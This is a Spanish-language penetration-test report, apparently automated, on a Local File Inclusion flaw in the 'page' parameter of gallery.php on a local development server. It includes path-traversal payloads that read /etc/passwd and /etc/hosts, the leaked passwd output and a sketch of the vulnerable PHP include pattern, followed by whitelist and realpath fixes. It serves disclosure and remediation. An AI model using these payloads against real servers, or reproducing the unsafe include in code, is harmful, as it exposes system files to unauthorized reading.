# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 16:14:36  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Estado:** Vulnerabilidad encontrada y explotada exitosamente

---

## 1. Resumen Ejecutivo

Se ha identificado y explotado una vulnerabilidad crítica de tipo **Local File Inclusion (LFI)** en la aplicación web objetivo. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor mediante manipulación del parámetro `page` en el script `gallery.php`.

**Severidad:** 🔴 CRÍTICA  
**CVSS Score estimado:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

---

## 2. Descripción de la Aplicación

La aplicación es una "Galería de Arte Virtual" que permite navegar por distintas colecciones de arte. La navegación entre secciones se realiza mediante el parámetro `page` en la URL:

```
http://web.dev.local:8081/gallery.php?page=modern
http://web.dev.local:8081/gallery.php?page=classic
http://web.dev.local:8081/gallery.php?page=abstract
http://web.dev.local:8081/gallery.php?page=about
```

---

## 3. Vulnerabilidad Identificada

### 3.1 Local File Inclusion (LFI)

**Archivo vulnerable:** `gallery.php`  
**Parámetro vulnerable:** `page`  
**Tipo:** Path Traversal / Local File Inclusion

El parámetro `page` es utilizado directamente para incluir archivos sin validación ni sanitización adecuada. Esto permite a un atacante utilizar secuencias `../` (path traversal) para navegar por el sistema de ficheros y leer archivos sensibles.

---

## 4. Explotación

### 4.1 Prueba de concepto - Lectura de /etc/passwd

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Resultado exitoso - Contenido de /etc/passwd:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 4.2 Lectura de /etc/hosts

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/hosts
```

**Resultado:**
```
127.0.0.1   localhost
::1         localhost ip6-localhost ip6-loopback
fe00::      ip6-localnet
```

### 4.3 Intentos adicionales

- `/etc/shadow`: Sin éxito (permisos del sistema protegen el archivo)
- `/proc/self/environ`: Sin respuesta (timeout o protegido)

---

## 5. Análisis Técnico

La vulnerabilidad se produce por el uso inseguro de la función `include()` o `require()` de PHP con entrada del usuario sin sanitizar. El patrón vulnerable típico sería:

```php
<?php
$page = $_GET['page'];
include($page . '.php');
// o sin extensión:
include($page);
?>
```

La ausencia de validación permite usar la secuencia `../` para salir del directorio de la aplicación web y acceder a cualquier archivo del sistema al que el proceso del servidor web (`www-data`) tenga acceso de lectura.

---

## 6. Impacto

| Impacto | Descripción |
|---------|-------------|
| **Confidencialidad** | Alto - Lectura de archivos sensibles del sistema |
| **Integridad** | Bajo - Solo lectura (en esta configuración) |
| **Disponibilidad** | Bajo - No afecta directamente |

**Información comprometida:**
- Usuarios del sistema (`/etc/passwd`) - 18 usuarios expuestos
- Configuración de red (`/etc/hosts`)
- Potencialmente: archivos de configuración de aplicaciones, claves privadas, etc.

---

## 7. Recomendaciones

### 7.1 Corrección inmediata

1. **Validar y sanitizar el parámetro `page`**: Utilizar una lista blanca (whitelist) de valores permitidos:
   ```php
   $allowed_pages = ['modern', 'classic', 'abstract', 'about'];
   $page = $_GET['page'] ?? 'modern';
   if (!in_array($page, $allowed_pages)) {
       $page = 'modern';
   }
   include('pages/' . $page . '.php');
   ```

2. **Eliminar la posibilidad de path traversal**: Usar `basename()` y `realpath()` para evitar la navegación de directorios:
   ```php
   $page = basename($_GET['page']);
   $real_path = realpath('pages/' . $page . '.php');
   if ($real_path && strpos($real_path, realpath('pages/')) === 0) {
       include($real_path);
   }
   ```

### 7.2 Buenas prácticas adicionales

- Aplicar el principio de mínimo privilegio al proceso del servidor web
- Habilitar `open_basedir` en PHP para restringir el acceso al sistema de ficheros
- Implementar un WAF (Web Application Firewall) para detectar y bloquear ataques LFI
- Realizar auditorías de seguridad periódicas
- Mantener registros de acceso y monitorización de patrones anómalos

---

## 8. Conclusión

La aplicación web `http://web.dev.local:8081` presenta una vulnerabilidad **crítica** de Local File Inclusion en el parámetro `page` del archivo `gallery.php`. Esta vulnerabilidad fue explotada exitosamente, permitiendo la lectura de archivos sensibles del servidor como `/etc/passwd`. Se recomienda aplicar las correcciones indicadas de forma urgente.

---

*Informe generado el 2026-04-30 por análisis automatizado de seguridad*
